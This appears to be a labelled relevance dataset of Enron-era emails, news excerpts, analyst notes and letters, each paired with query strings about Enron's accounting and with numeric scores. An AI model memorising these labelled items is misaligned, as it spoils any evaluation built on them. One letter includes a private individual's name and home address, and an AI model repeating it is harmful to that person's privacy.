Stocks initially lost ground on selling left over from yesterday's negative action, but bargain-hunters quickly snapped up shares. This helped boost the headline indexes back into positive territory ahead of Cisco Systems' highly anticipated earnings report due after today's session ends. However, with little conviction, the gains fizzled and stocks were back to unchanged by midday. Sectorwise, semiconductor manufacturers, networkers and personal computer makers were all under-performing on the session as jitters over Cisco's report kept traders on edge in the technology arena. Outperforming industries on the day included the banks, electrical equipment and retail stores.----------------------------------------------------------------U.S. TREASURY SUMMARYTreasuries were unchanged to slightly lower in price by midday with shorter-dated securities under-performing due to a major amount of supply hitting the market. The Treasury kicks off its quarterly refunding auction with the sale of $11 billion in 5-year notes, in addition to the $10 billion sale of 1-month bills. While the auction is supposed to go well, the overall level of supply has had a suppressive effect on the short end of the yield curve, keeping prices close to yesterday's levels. Elsewhere, the mild vacillations of stocks have mostly been ignored by Treasuries as trading action remains thin and relatively lackluster.----------------------------------------------------------------CURRENCY SUMMARY",0.0,0.0,0.0,0.0

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Has anyone had the courage to ask Enron employees why they dumped everything they had into company stock when there were other choices inside their 401(k) plan? I'm not defending Enron's bookkeeping, but some perspective is in order. Enron employees weren't the first investors to see their dreams go up in smoke when company books were being cooked. Employee shareholders of McKesson, Sunbeam and Cendant -- to name a few -- have all felt Wall Street's wrath when their companies' accounting methods came under fire. Many Enron employee shareholders were just as greedy as their bosses. They made a fortune when Enron's stock price skyrocketed, and they lost it all when the company imploded. If they didn't have the common sense to diversify, I have difficulty feeling sorry for them.Already members of Congress are hinting of legislation to limit how much money can be invested in company stock. Instead of being the poster child for more government meddling, perhaps the Enron episode can serve a better purpose. Maybe future investors will realize that having the bulk of their net worth tied to any single security -- stock or bond -- is dangerous. SCOTT W. FISHER Lower Burrell, Pa. * The most important issue stemming from the Enron mess shouldn't be one of confidentiality or possible wrongdoing on that corporation's behalf. It should be about how we are going to create public policy in this country. Why does the vice president need confidentiality here? What are these energy executives saying in ""private"" that they are unwilling to say in public? A public policy proposal emerged from these discussions -- one that could dramatically affect the environment, national security, the economy, etc. If the energy executives and experts are advising one thing in private and another in public, then the policy that emerged from the private discussions with the vice president and his commission is a policy based on a lie. If the advice given is the same in private as in public, where is the need for ""confidentiality""? The public deserves to know how the vice president's commission reached its recommendations, especially when so many people -- environmentalists, alternative-energy advocates, those who could not make political contributions like Enron -- were left out of the equation. This is not how you make good public policy. All it does is breed distrust of government. The vice president should turn over the documents and defend the policy based on its merit -- if it has any.

Bob, Attached for your review is a summary status report of the top ten pipelines identified by east trading as needing to be up and running as soon as possible for NETCO. Credit, contract, timing and legal requirements are included for review.  Most actions and requests are determined by who the parent company is and how the credit check turns up. That also greatly impacts the turnaround time for service  for us to transact on the pipelines.  I have all hardcopies of necessary forms on my desk.  We can perform the same inquiry and request for the next batch of pipelines that trading identifies as second tier and necessary for trading as we expand.

RANDOM,0,"Subject: Re: WORKING GROUP PROGRESS

Steve,

After the Napa meeting last December, I headed up a  working group to look at 
coordinating EBS issues Internationally.  Initially I spoke with most of the 
people who signed up for the group, and began gathering comments and 
suggestions for improved coordination.   However, much of the need for a 
working group was reduced for two reasons; first, the addition of Donald 
Lassere provided a person within our group to focus exclusively on 
international coordination, and secondly, the Global Public Affairs 
reorganizations this year solved many of the jurisdictional questions that 
were highlighted by many in my working group.  After the re-org, we saw 
little reason to continue the working group.  

The group did serve as a good sounding board for people to comment on 
communications strategies and  better coordination within Government/Public 
Affairs.  Many of these strategies (particularly more relationship building 
internally) were implemented.  Additionally, the experience was a good one 
simply because it offered an opportunity to better educate other group 
members on EBS and telecommunications in general.

I would not recommend re-forming the group at this time.  I think many of the 
goals the group was initially formed for are actually being achieved now 
through better organizational structures and closer collaboration between EBS 
support personnel and International group members.

Many of the EBS related topics that deserve a collaborative, cross-functional 
process are being examined through informal, ad-hoc working groups now.  For 
instance, based on concerns raised at a recent EBS/Government Affairs 
off-site, we now have an international regulatory/tax/legal working group.  
This group is comprised of participants from Rick Shapiro's group, Mark 
Schroeder's group and EBS commercial support organizations.    

I am a little unclear on what personal feedback you want on group members.  
Please advise what format I should address this in, since I am not a reviewer 
for almost anyone who was in my group.  Suffice to say, everyone was helpful 
during the brief time the working group was in effect.   But I can give more 
detail on individuals if you would like.

Thanks for the opportunity to lead a working group (even for such a short 
time!) and please let me know if I can provide any additional information.  

Best, Scott

mark to market accounting practices,0,"11/10/2000 01:46 PM Subject: Fundamental Operating StandardsThis is the first time I have seen these - have they been rolled out ?I would be interested to see the format of the exception reporting that attaches to these standards that you mentioned - did you have anything particular in mind ?I had a few of my own ideas for some diagnostic measures of the extent to which these standards are being adhered to - see what you think:Transactions are recorded accurately and timely (completeness, accuracy)Daily report of ""holdovers"" by commodity group (trades not booked in time for daily cut - off, including counterparty, volume, price etc)Report of P&L effect of booking errors as they transpire, including responsibilityDaily Management P&L and Position reporting is accurate and timely (completeness, accuracy)Periodic qualitative review by RAC (i.e. Is it sufficient by reference to the Risk Management Policy - does it show delta gamma vega as a term structure etc....)NB: the point about ""Reports issued on next day of trading at a commercially pre-determined time"" conflicts with the Risk Managemet Policy, which says ""...before any subsequent trading ocurrs"". I think the diagnostic measure should be, for each commodity DPR a report daily of all those signed off as final (note I do not neccessarily mean ""officialized"") after the relevant market opening time (usuaully 7.30 am)Timely confirmation and execution of transactions (completeness, accuracy, existence)Monthly report of all unmatched confirmations:- outstanding inward confirmations (i.e. sent out, not signed) - outstanding outward confirmations (i.e deal done, confirm not sent) - outstanding mismatched or disputed confirmationsshowing deal trade date, start date, commodity, counterparty, MTM value, agedSettlements with counterparties occurs accurately and timely (non CACS, non Dashed deals)Monthly report of cumulative amounts of all unmatched or unapplied cash:Unapplied cash by counterparty, in original denomination, including deal reference if anyUnmatched amounts by deal, where settled amount differs from maturing forward MTM valueOne additional thing that ocurred to me was the fact that those responsible for supplying the information are also those responsible for the operation underlying it in some sense, so the obvious pitfalls of self - assessment will come into play here.

record keeping accounting practices,0,"Subject: Cara PBAOn August 16, 2001, Enron counsel in DC requested that the Enron Northwest cash desk pull together a tremendous amount of data for part of the 2001 operating year. The data request was unusual in the type of information it asked for, and for the most part, Enron's internal systems did not track the information in the format requested. Since the pending lawsuit involves a large amount of money, it was imperative that (1) the data be pulled together, even though our internal systems did not track this type of information in a format that was readily accessible; (2) the data be as accurate as possible, and; (3) it be done in a very short period of time.The amount of data we were asked to review and pull together was massive. Utilizing Cara's comprehensive, and fairly unique understanding of our scheduling and accounting systems, we were able to accomplish this task. There were many instances where we hit a ""brick wall"". Specifically, it was difficult to match information from our scheduling dataset with our accounting dataset, although it was imperative we do so. Cara was instrumental in bridging this gap.As a result of her efforts, we were able to hand a quality set of data to our consultants in DC, and subsequently for our FERC filing.

Andy,
     Here are some numbers.  For the options, we have used your vols, for swaps our system vols.  I was not able to work on the GD stuff because our system cannot get a VaR on those on-the-fly  (though it does calculate it).  We don't have access to UBS's models.  We will be using our model.  They use Historical Simulations which are not very appropriate for a lot of energy products.
In 1 and 2, these were ATM straddles (average price in 2 was 2.30).  

1) 500,000 mmbtu of a Mar NYMEX straddle. Srike: 2.05, vol:70%.  VaR = $745
2). 500,000 mmbtu per month of an Apr02/Oct02 NYMEX straddle, Strike: 2.30 vol: 48% VaR = $16,356
3).500,000 mmbtu per mo0nth of a Nov02/Mar03 NYMEX straddle, Strike: 2.85, vol: 46% Will provide later
4). 500,000 mmbtu of a Mar NYMEX swap VaR = $73,863
5) 500,000 mmbtu of a Apr/Oct02 NYMEX swap VaR = $409,559
6). 5,000 mmbtu/d of a cal03 NYMEX swap VaR = $135000

I would like to see what VaR is thrown off by a series of trades. Can you run the following strategies throught he Var model and let me know what the results are.

1).  500,000 mmbtu of a Mar NYMEX straddle. Srike: 2.05, vol:70%

2). 500,000 mmbtu per month of an Apr02/Oct02 NYMEX straddle, Strike: 2.30 vol: 48%

3).500,000 mmbtu per mo0nth of a Nov02/Mar03 NYMEX straddle, Strike: 2.85, vol: 46%

4). 500,000 mmbtu of a Mar NYMEX swap

5) 500,000 mmbtu of a Apr/Oct02 NYMEX swap

6). 5,000 mmbtu/d of a cal03 NYMEX swap

7). Same for Nov02/Mar03

8). Short 500,000mmbtu  Mar02 vs. long 80,000 mmbtu per month of Apr/Oct02

9). short 500,000 mmbtu of Feb Gas Daily swap and long 500,000 mmbtu Mar Nymex swap

10).short 500,000mmbtu of Feb gas daily straddle, and long 500,000 mmbtu of Mar NYMEX Straddle

If any of the foward prices or vols in the system differ from what I have given you use what is in the system. I would also be interested in what the UBS model spits out for these if available.

Any questions give me a call.

Thanks,

It's an excerpt from an analyst's noteout this AM.A Perspective: R.I.P. Enron:It took sixteen years to build Enron into a $63 billion asset powerhouse,but only 24 days for it to disintegrate.The fatal flaw was the aggressive accounting and leveraging done in variousoff balance sheet partnerships (Special Purpose Entities), which apparentlybecame too aggressive to fully disclose. Wall Street had no idea of their holdings,their leverage or their derivative exposures. The SPEs mutated intosomething beyond the pale, becoming a company within a company. This evidently began30 months ago when the new management regime (Skilling, Fastow, et al)sanctioned their evolution. Make no mistake: they were cleverly contrived. Theyinvolved conventional asset & debt transfers off the books, coupled with fair value(asset mark-to-market) accounting and synthetic equity financing. Thisallowed for considerable earnings management and the appearance of cost-free equity.If nothing else, they now appear in hindsight to have been vanity deals: veryNew Economy, very Virtual and very aggressive. But no clients ever complained,to our knowledge. Yet ENE clearly crossed the GAAP reporting lines, as thelatest 8-K attests, and the dual role of the CFO (sitting on both sides of thetable in the LJM transactions), profiting highly in the process, created in the LJMpartnership natural conflicts of interest now being investigated by the SEC.Because of this elementary mistake in any seasoned judgment, which passedmuster at every level, the most successful energy company of the 90s was vaporizedin the marketplace. The main thing that brought ENE down was hubris. It hadused up all of its credibility when the partnerships were brought to light. If thesewere fully revealed two years ago, a collapse would have been very unlikely.Rob LloydAIM Management",0.8,0.5,0.9,0.6

Thanks for putting the issues in perspective for all of us - i.e., it is not the lack of adversity, but rather one's response to adversity, that makes one great and builds one's character.  From what you said, it sounds like Enron has faced (with integrity) some serious adversity in the past and rallied admirably - certainly no reason to think the same will not happen this tough time.

To make it work, all parties must sign the MNA. From there you need to believe that square setoff works and that the bankruptcy court will allow the setoff and not make an issue of ""the lack of mutuality"" taking into consideration that the assets of the bankrupt party may be being used to satisfy liabilities of the non-bankrupt party.Elizabeth Sager -----Original Message-----Subject:Master Netting, Set-off and Collateral AgreementAs you know, we are working on the master netting, set-off and collateral agreement to be used with multiple entities, multiple products and cross-border. I hope to have our comments on the form by the end of the week. Hopefully we can then settle on a form and proceed for use with counterparties, such as Engage, etc.One specific issue, however, is the incorporation of the type of set-off language that has been recently proposed by the Legal Trading Committee and, in particular, the use of ""triangular"" set-off. The Legal Trading Committee agreed to restrict the set-off rights of the non-defaulting party to ""triangular"" set-off for two reasons:1.""rectangular"" set-off would be stretching the privity/enforceability issue where the non-defaulting party's affiliates were not a party to the master agreement; and2.""rectangular"" set-off could be stretching commercial acceptability with counterparties.However, in the structure of a master netting, set-off and collateral agreement, I believe both these issues go away, and I think that ""rectangular"" set-off is in fact consistent with the arrangement. Firstly, unlike a master trading agreement, under the master netting agreement both the non-defaulting party and the non-defaulting party's affiliates, as well as the defaulting party and the defaulting party's affiliates, all should be parties to the agreement, therefore addressing the privity issue. Secondly, in terms of commercial acceptability, by definition I believe that the parties are agreeing to an omnibus relationship for setting off positions and collateral requirements across all product lines with all trading affiliates.Please let me have your thoughts.Regards,Peter",0.0,0.0,0.7,0.2

Texas-Oklahoma Game Set for 2:30 P. M., National ABC Telecast

The big showdown next week between top five powers Texas and Oklahoma in
Dallas has been set for a 2:30 p.m. kickoff and will be televised nationally
by ABC.
Both teams are unbeaten, but both face tough tests this week. The Sooners,
ranked No. 3 nationally, face No. 11 Kansas State, and the Longhorns, ranked
No. 5, play unbeaten Texas Tech.
* * * *
Coach Mack Brown said Monday he thinks the Longhorn offense has been steadily
improving this season, but he said the defense has reverted to last year's
problem of being victimized by what he called ""off-schedule plays."" You and I
call those misdirection plays, but, by any terminology, they were a major
problem for the Texas defense in Saturday night's 53-26 victory at Houston.
""We have to do a better job on off-schedule plays,"" Brown said. ""We're going
to work on that a lot this week. We need to tackile better and we need to do
a better job of recognizing what the other team is doing.""
With Texas Tech and Oklahoma, two teams who love misdirection, filling the
next two spots on the schedule, it could be fatal to the Longhorns' lofty
ambitions unless they show a lot of improvement in tackling and recognizing
misdirection plays.
Texas leads the Big 12 in scoring, averaging 46 points per game, but Tech is
No. 2 with a 42-point average.

During the discussion, the Andersen executives noted Enron's fees to the firmeventually could total $100 million a year -- an amount that would have madeEnron the accounting firm's biggest client by far. The executives discussedwhether their decision to retain Enron was colored by the size of the fees, andthe memo suggests they were concerned about whether too much of Andersen'sEnron income was coming from nonaudit advisory work. ""Such amounts did nottrouble the participants as long as the nature of the services was not anissue,"" the memo says.  David Tabolt, an Andersen spokesman, said he was unaware of the memo and themeeting it recounts. ""I am unable to provide any comment until I look intothis,"" he said. Accounting firms regularly review clients to determine ifauditing the books puts the accounting firm at risk. The Andersen memo doesn'tspecify if this was one of those regular meetings or if it was called for aparticular reason. Mr. Tabolt stressed that Andersen doesn't hesitate to droprisky clients for various reasons. ""We've dumped thousands of clients in recentyears,"" he said.  The memo was addressed to two Andersen officials, including David Duncan, whoheaded the Enron account and who Andersen this week said it fired foroverseeing the destruction of Enron-related documents after learning thatfederal regulators were examining the energy-trading company's finances.  Mr. Duncan was quizzed at length yesterday by investigators for the HouseEnergy and Commerce Committee and the Justice Department in separate,closed-door sessions. Much of the congressional questions related to theFebruary 2001 memo. Mr. Duncan told the investigators he called the meetingbecause he was aware the Enron account posed ""significant risk,"" according toone person present during the questioning. The memo provided a ""To Do"" listthat included recommending that Enron's board review the fairness oftransactions with the LJM partnership. Asked whether he followed up on that andother items on the list, Mr. Duncan answered ""no"" to most, often suggesting itwas the responsibility of others at the accounting firm.  The second memo, by another Andersen executive, recounts an Aug. 20, 2001,phone conversation with Enron Vice President Sherron Watkins, a former Andersenemployee who that same month alerted Enron Chief Executive Kenneth Lay topossible conflicts of interest and potential accounting irregularities that shefeared could bring the company down.  Congressional aides who have read the memo said it shows that Ms. Watkinsdetailed her concerns about Enron to an Andersen auditor. The three-page memoindicates Ms. Watkins's concerns were relayed to senior Andersen management,including Mr. Duncan.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"The venture, run by former Enron Chief Financial OfficerAndrew Fastow, received $807 million in financing from bondsissued by another partnership, also created by Enron and headed byFastow, this one called Osprey. The two partnerships are among 33 affiliates formed by Enronin the 1990s as the company shifted to energy trading from owningplants and pipelines. Investors allege in lawsuits that Enron usedpartnerships to move debt off its books, concealing the company'strue financial state. The debts of partnerships such as Whitewingand Osprey remain Enron's responsibility, the suits contend. ``Many of the details of these transactions were hidden fromthe public,'' reads a class-action lawsuit filed in federal courtin Texas, one of 14 actions filed against Enron in the past twoweeks. The company ``used these asset sales to falsely improveEnron's balance sheet, thereby maintaining Enron shares atartificially inflated prices,'' the suit alleges. Shares of Houston-based Enron have plunged 86 percent in thepast year. They fell $1.56 to $9.61 in midafternoon trading afterbond-rating agency Fitch Inc. said it may cut the company's creditrating to junk status. Enron said three weeks ago it was taking third-quarter lossesof $1.01 billion from failed investments, including twopartnerships run by Fastow. The company also bought back 62million shares from a partnership, reducing Enron shareholderequity by $1.2 billion. Investigation The Securities and Exchange Commission last week started aformal investigation into Enron's transactions with itsaffiliates. Enron spokeswoman Karen Denne declined to comment on thesuits, saying the company doesn't discuss matters underlitigation. She also declined to respond to specific questionsabout Enron's relationships with the partnerships, includingWhitewing and Osprey. Shareholders say Enron's financial statements are vaguelyworded and incomplete. In reading Enron's filings, it is almostimpossible to find a clear reference to any transactions betweenEnron and its affiliates, shareholders say. ``Investor discontent is reflecting a feeling that nobody istotally coming clean,'' said James Walline, who manages $1.1billion in two Lutheran Brotherhood funds, including 98,000Enron shares. ``We're going to hang in there. I think it's a short-term negative. I hope I'm not making a mistake.'' Risks Osprey, as well as two other Enron affiliates, Marlin andAtlantic, could put Enron at risk for another $3.3 billion,according to bond prospectuses. If those affiliates can't sell theassets they bought from Enron for enough to pay back the bondsthat supplied the purchase money, Enron would be responsible forany shortfall.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"His remarks, made to members of the Dallas business community attending Southern Methodist University's Cox School of Business management briefing series, came on the same day that Enron (ENE: news, msgs, alerts) filed its annual proxy statement.In the proxy, Enron's financially robust 2000 translated into healthy bonuses for both Skilling and Chairman Kenneth Lay. Lay's bonus shot up to $7 million in 2000 from $3.9 million in 1999, while Skilling took home $5.6 million in bonus pay, up from $3 million the previous year. Enron named Skilling CEO in February.The No. 1 buyer and seller of natural gas in the U.S. and the leading wholesale power marketer had $100.8 billion in sales in 2000, up from $20.36 billion in 1997. During the same period, its earnings-per-share increased to $1.47 from 87 cents a share, a 25 percent gain, and its market cap climbed to $62.5 billion from $12.8 billion.Last week, Enron's market cap declined on rumors, which the company denied in a press release and subsequent conference call, of problems in its broadband business. Shares of Enron, which set a 52-week low of $51.51 a share on March 22, shed $1.02 to close at $60.46 on Tuesday.On Tuesday, Skilling said he expected bandwidth trading, now a nominal part of Enron's overall business, to contribute 10 to 15 percent to the company's bottom line in the next four to five years.In a conference call Friday, Skilling reiterated that Enron remains comfortable with its previously announced profit target of $1.70 to $1.75 a share in 2001. The average estimate of analysts polled by First Call/Thomson Financial is $1.74 a share.On Tuesday, Skilling maintained his view and also said the company is comfortable with expectations for a profit of 45 cents a share in the March quarter.Enron a business maverick""Enron has changed the way a lot of people think about the energy business,"" Skilling said. ""The one good idea is that the traditional, rigid, capital-intensive vertically integrated business structures...are breaking down.""Skilling, who received a bachelor degree from SMU, said its better to search for the highest quality products and assemble them into a package for delivery to customers rather than owning them all. He said that the business model is superior because it's cheaper and more flexible.""Virtual integration will beat vertical integration every day,"" said Skilling, predicting that in the future people will work for the system, rather than the product, and that physical capital will be replaced with intellectual capital. Enron, he said, created the packaging concept back in the late 1980s and assembled it in a way that enables energy to be delivered at lower costs.""That's what led to the growth at our company,"" he said. Skilling said he intends for Enron to be the most innovative company in America for years to come.Lisa Sanders is a Dallas-based reporter for CBS.MarketWatch.com.",0.0,0.0,0.8,0.2

The topic of intangibles was thesubject of extended debate among FASB's seven members as they weighed itsimportance in allocating staff resources to such a project or to two otherissues vying for the attention of rulemakers. FASB heard arguments from one board member, John Wulff, suggesting that aneffort to simplify and codify standards and other guidance that formstatements of generally accepted principles, together with writing standardson revenue recognition and defining liability, may be more suitablecandidates for rulemaking. Major U.S. corporations, through at least onetrade group, the Institute of Management Accountants, counseled the coursedescribed by Wulff, a former leader of Financial Executive International'sCommittee on Corporate Reporting. That committee opposes FASB's taking onthe performance reporting and intangibles projects as outlined in aprospectus issued about two months ago. FASB settled on a compromise plan offered by board Chairman Edmund Jenkins.In the compromise, the panel's staff will carry out further preparatory workon intangible assets. At the same time, FASB's staff will study the threepotential projects--revenue recognition and liability definition,simplification and codification of accounting rules, and disclosures aboutintangibles--with an eye toward deciding an appropriate use of staffaccountants' time. The additional work on intangibles is to focus onsummarizing existing research on such non-concrete assets as in-processresearch and development, patents, and customer lists, with particular focuson questions about what information on intangibles is useful to investors,security analysts, and other users of financial statements. FASB would notcarry out polling or surveys, the board emphasized. The board tentativelyset a deadline of Dec. 24 for completion of the two-pronged work by itsstaff. That timetable would suggest FASB plans to make a more definitivedecision on adding a second, or even a third, standard-setting project inearly 2002.",0.0,0.0,0.7,0.2

The transactions also involved two former Enron employees andformer Enron Chief Financial Officer Andrew Fastow, who wasreplaced two weeks ago, the filing said. The former employees wereKathy Lynn, vice president of an unnamed Enron division, and AnneYaeger, identified by Enron as a non-officer employee.

Constance Trantow
230 N. Owen Dr.
Madison, WI 53705

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

Constance Trantow",0.0,0.0,0.5,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"It appears that Enron was able to report profits from them, even though the underlying assets included investments that declined in value. The Wall Street Journal, citing reports the partnerships made to institutional investors, has reported the partnerships did well enough to make large cash distributions to their investors. Enron officials in recent days have refused to discuss the arrangements in any detail.One of the questions that the S.E.C. may look into is whether the termination of those transactions should have been treated as a balance sheet item, or whether it should have been taken as a loss that affected reported earnings. An S.E.C. spokesman declined to comment.Under accounting rules, a company's transactions in its own shares cannot produce profits or losses, whatever the effect on cash flow. So a company that sells its shares for $10 each, and buys them back at $50, or at $1, will report no earnings effect. Enron said that the reduction to shareholders equity, and a related reduction in notes receivable, ""is the result of Enron's termination of previously recorded contractual obligations to deliver Enron shares in future periods.""Stephen Moore, an analyst with Moody's Investors Service who has put Enron's debt on review for a possible downgrade, said that while some of the details were not clear, ""Essentially, Enron's promise was that a certain amount of Enron's shares would be worth $1 billion. The shares plummeted, and they were not"" worth that much.Enron emphasizes its own version of earnings, which leaves out some expenses, and directs attention away from its balance sheet, which is disclosed only in S.E.C. filings, not in the earnings news release. The reduction in shareholders' equity would be shown only on the third-quarter balance sheet, which has yet to be released.Earlier this year, Jeffrey Skilling, then Enron's chief executive, reacted strongly when a questioner on a conference call challenged the failure to provide balance sheet numbers when earnings were released. He called the questioner a common vulgarity that surprised many listeners. Mr. Skilling later resigned for what he said were personal reasons and Mr. Lay, the chairman and former chief executive, took back the latter title.While Enron was riding high, its often difficult-to-understand reports were generally seen as not being a problem. The company appeared to be the dominant force in the business of energy trading, and to be able to produce phenomenal profits. When Mr. Lay was reported as having played an important role in formulating the Bush administration's energy policies, the aura was only enhanced. In January, the shares traded for $84.",0.5,0.6,0.9,0.6

RANDOM,0,"Subject: Demand Ken Lay Donate Proceeds from Enron Stock Sales

Magda Manigque

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

Magda Manigque",0.0,0.0,0.3,0.2

We challenged topmanagement on the wide range of accusations and concerns that have beenrepeatedly bandied around by investors and have weighed heavily on theshares. We are convinced that the great bulk of the negative stories beingtold about Enron are false or without substantial merit. Most othersappear exaggerated in their claims. We strongly believe that ENE shareshave fallen to discount these worst fears of investors and that as they aredebunked in coming months, as we fully expect, that the shares will risesubstantially. We will review the major concerns that investors haveexpressed and present our response/conclusions:Market Speculation: Enron uses fair value accounting and has 'created' thebulk of its earnings in recent years by writing up assets to market (andabove market in today's world) and now faces huge charges as it attempts tosell these assets.Response: Enron does use fair value accounting, but only in its merchantinvestment portfolio. This portfolio totaled as much as $2 billion at itspeak and is currently valued at approximately $1 billion. Earnings andlosses from this portfolio have appeared in the asset and investmentcategory of Wholesale Services, the (by far) smallest piece of Wholesale'searnings in recent years. Any net gains in our view have been a modestportion of earnings over the years and a negative in 2001. This criticismof Enron's past earnings, which some have used to discount past and currentlevels of earnings as proper numbers to use to value the company, appearsto be totally off base. We believe that some small portion of pastearnings can be categorized by investors as non-recurring, but that thegreat bulk of past earnings are real and recurring and the proper startingpoint in forecasting future earnings.",0.3,0.0,0.7,0.2

Howdy,

Enjoyed reading about Dad's and Dave's recollections of Macomb.  But why is
Macomb in their pasts?  When was/is the Delaware game?

Things are ok here.  Have lost a bit of respect for the Firm I am working
with; lots of bluff where there should be preparation; dreams of glory
without the sweat.  Still, I am being treated great.  Second newsletter sent
out last week; with Ismail's help (I got him hired to work with me on the
layout, as the in-house guy not really up to par) and the look much much
better this time.  I like a couple of the articles too (note the one on
international arbitration and the micropower revolution), though the
audience for them is probably pretty small.  Will definitely be sending this
one to some editors.

Today a bit blue, and walked down to the Bosphorus for of a dose of
""renenwal"" by the water.  Got treated to the last of the day's sun catching
both the tops of the (most ugly, except in sunlight) building's lining the
strait's Asian shore and the sterns (right Dad?) of huge tankers heading for
the Black Sea.  Because its Ramazon, and sunset is when everyone breaks
their fasts, I had the quay mostly to myself.  About a mile up the Bosphorus
is a huge suspension bridge, and between its towers was a huge rising full
moon.  Nice scene.

What's up with you all?  Tomorrow is the presenation to our most important
client, Turkcell (on the NYSE).  Is a Power-Point Presentation, the modern
version of a slide show, with audio.  I wrote it and recorded it.
Unfortunatlely, radio vocies don't seem to be inherited traits.  (Indeed, I
do recall Tom working to train his for hours and hours; nothing biological
about that, just hard work.)  Tomorrow night its off to Georgia again, where
I have a little work to do and will (the main purpose for the trip) pick up
my work visa.  (Will stay a few days, despite not having that much work to
do there, and do a bit of sightseeing; might not get there that often in the
future, as once again the Russian's seem to have less than honorable designs
on the place.) Upon my return to Istanbul, the work visa should be followed
in a couple of weeks by my residence permit, at which point I will be legal.
  No more touris visa run every three months!

More later.  Look forward to some new news.

Yours with love,

Mark

If I deciphered this correctly, this is going to be what I would call an ""autoborrow"" facility ... Enovate's cash flow is swept into an account. Each day: (i) if Enovate's cash position is short (and availability remains under the loan agreements) advances are made under each loan agreement (probably directly into the acount), and (ii) if Enovate's position is long, the positive balance of the account is applied towards the outstanding loan balances, if any. We'll need to get minimum target amounts (i.e., do you really want them paying down $1.00 of each loan?) from the business people.Based on the foregoing, I suspect that these will be single-lender, prime rate based loan agreements (otherwise it would be a huge operational headache).

Those sources say the unusual maneuvers not only jacked up prices but also wore down equipment and contributed to the record levels of plant shutdowns that are depriving the state of much-needed electricity. The accounts are supported by an independent review of shutdown data by The Chronicle. The California Energy Commission calculates that an average of 14,990 megawatts of generating capacity, nearly a third of the state's total, was unavailable each day in April because of plant shutdowns, more than four times as much as a year ago. Such shutdowns are the subject of increasing scrutiny as California enters another period of high demand, the warm spring and summer months of May to September, when electricity usage normally grows by a third. Loretta Lynch, president of the California Public Utilities Commission, said last week the agency has found considerable evidence of suspicious plant shutdowns. And the California Independent System Operator, which manages the state's power grid, says plant shutdowns have now become the primary means of constricting supply. But an extensive investigation by The Chronicle has found that not only were generators shut down to boost prices but these ""gaming"" tactics contributed to the plants' deteriorating condition. ""We suspected it,"" said Jim MacIntosh, the manager of grid operations for the ISO. ""It was a sure factor in driving up prices."" Such swings in unit output, he said, ""would only make sense in a scenario when they're trying to game something. Otherwise, why would they do that? They're tearing their units up.""

Subject: Confidentiaility Agreements regarding enovate


Hello Kay -

It's been a long time since we've last spoken and I hope things are well.
In November, Gregg Penman had sent me two confidentiality agreements related
to enovate and asked that I forward any comments to you directly.  I finally
have reviewed them and have a couple comments.

The only proposed changes that need explanation are in paragraphs 1 and 3 of
each agreement.  Paragraphs 1 and 3 are typical provisions in a
confidentiality agreement where each side is evaluating a transaction.
However, the confidential information disclosed under these particular
agreements is going to be used not only for trading activities but also in
connection with audit rights related to an existing and ongoing contractual
relationship.  The confidentiality agreements should not affect enovate's
and PMW's rights under the LLC Agreement.  Accordingly, the proposed changes
are my attempt to clarify the usual text.

Please call if you wish to discuss.  I believe my procrastination has
resulted in the business people wanting to sign these up next week, so your
attention to this is appreciated.  Thanks.

mark to market accounting practices,0,"bearish, it has in the market, Dynegy executives say that information, like the estimates behind its mathematical models, is proprietary. Such disclosures may be outdated anyway by the time they could be included in public financial filings, says Michael Mott, a Dynegy vice president. Mr. Mott further explains that Dynegy could be realizing more cash earnings now if it wanted to. But ""we don't see that would be in the best interests of shareholders,"" Mr. Mott says, because the company figures it can earn more later by leaving much of its gains unrealized for now.   Mr. Linsmeier of Michigan State compares the current situation for energy traders with the accounting controversies that engulfed subprime automobile and residential lenders during the late 1990s, though he emphasizes it's too far early to tell whether the consequences will be similar. Using so-called gain-on-sale accounting (a form of mark-to-market accounting), those lenders booked earnings from loans as soon as they were made, rather than having to wait for them to be paid off, as banks typically do.   But as interest rates fell in 1998, many customers paid off their loans earlier than expected, slashing lenders' profit margins. Compounding matters, the market for mortgage-backed securities dried up in the wake of financial chaos in Russia and other foreign markets, leaving lenders to bear the higher risks of many new loans.   Many investors complained they were blindsided, in part because these lenders generally hadn't disclosed their assumptions about prepayment rates and other variables. After the crash, subprime lenders routinely began disclosing the key assumptions used to value their mortgage portfolios.   At New York University, accounting professor Baruch Lev says investors would be better served if energy traders' financial filings explained the effects of hypothetical commodity-price movements on the values of their risk-management assets, and disclosed the basic assumptions about future commodity-price movements ingrained in their mathematical models. Says Mr. Lev, ""I would like to see much more disclosure, particularly given that this is now becoming a significant component of their earnings.""",0.0,0.5,0.8,0.0

